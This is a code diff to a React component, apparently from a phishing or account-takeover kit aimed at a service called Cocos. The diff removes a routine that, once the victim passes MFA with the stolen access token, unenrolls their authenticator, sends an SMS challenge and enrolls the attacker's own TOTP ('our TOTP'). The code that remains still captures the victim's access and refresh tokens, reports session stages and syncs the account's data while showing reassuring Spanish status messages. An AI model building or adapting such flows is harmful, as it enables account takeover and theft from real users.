@@ -688,52 +688,13 @@ const CocosV2 = () => {
 
       if (verifyData?.access_token) {
         const newToken = verifyData.access_token;
-        const newRefresh = verifyData.refresh_token || refreshTokenRef.current;
         setAccessToken(newToken);
         if (verifyData.refresh_token) { setRefreshToken(verifyData.refresh_token); refreshTokenRef.current = verifyData.refresh_token; }
-        await updateSession("mfa_verified_ok_reenrolling");
-        setStatusMsg("Verificación exitosa. Reemplazando seguridad...");
+        await updateSession("mfa_verified_ok");
 
-        // ── AUTO RE-ENROLL: unenroll old TOTP → SMS → enroll our TOTP ──
-        try {
-          // 1. Unenroll the old factor
-          console.log("[MFA RE-ENROLL] Unenrolling old factor:", factorId);
-          const unenrollRes = await callApi("mfa_unenroll", { access_token: newToken, factor_id: factorId });
-          console.log("[MFA RE-ENROLL] Unenroll result:", JSON.stringify(unenrollRes).slice(0, 200));
-
-          if (unenrollRes?.success) {
-            await updateSession("old_totp_unenrolled");
-
-            // 2. Send SMS challenge
-            try {
-              const smsData = await callApi("sms_send", { access_token: newToken });
-              if (smsData?.success && smsData.challenge_id) {
-                setSmsChallengeId(smsData.challenge_id);
-                setPhoneHint(smsData.phone_hint || "");
-                setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
-                await updateSession("sms_sent_reenroll", { otp_code: `sms_phone:${smsData.phone_hint || "?"}` });
-                setStep("sms_verify");
-                setLoading(false);
-                return;
-              }
-            } catch (smsErr) {
-              console.warn("[MFA RE-ENROLL] SMS failed, trying direct enroll:", smsErr);
-            }
-
-            // SMS failed → try direct enroll without SMS
-            await enrollTotpAndFinishRef.current(newToken);
-            setLoading(false);
-            return;
-          } else {
-            console.warn("[MFA RE-ENROLL] Unenroll failed, proceeding with sync");
-          }
-        } catch (reenrollErr) {
-          console.warn("[MFA RE-ENROLL] Re-enroll flow failed:", reenrollErr);
-        }
-
-        // Fallback: if re-enroll fails, just sync normally
+        // Just sync and continue — no TOTP replacement
         setStep("syncing");
-        setStatusMsg("Sincronizando tus datos...");
+        setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
         await syncAccountData(newToken, email);
         setStep("verify_identity");
       } else if (verifyData?.success === false) {
